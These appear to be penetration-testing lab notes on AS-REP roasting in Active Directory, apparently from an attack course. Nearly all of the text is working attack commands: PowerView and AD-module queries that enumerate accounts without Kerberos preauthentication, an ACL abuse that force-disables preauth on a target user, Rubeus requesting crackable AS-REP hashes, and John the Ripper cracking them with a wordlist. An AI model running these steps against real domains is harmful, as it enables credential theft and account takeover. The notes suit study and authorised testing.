*  If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
* With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.

* Enumerating accounts with Kerberos Preauth disabled
*  Using PowerView:
```
Get-DomainUser -PreauthNotRequired -Verbose
```

*  Using ActiveDirectory module:
```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

Force disable Kerberos Preauth:
* Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

```
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
```

```
Get-DomainUser -PreauthNotRequired -Verbose
```

* Request encrypted AS-REP for offline brute-force :
```
C:\AD\Tools\Rubeus.exe asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt
```

```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
```

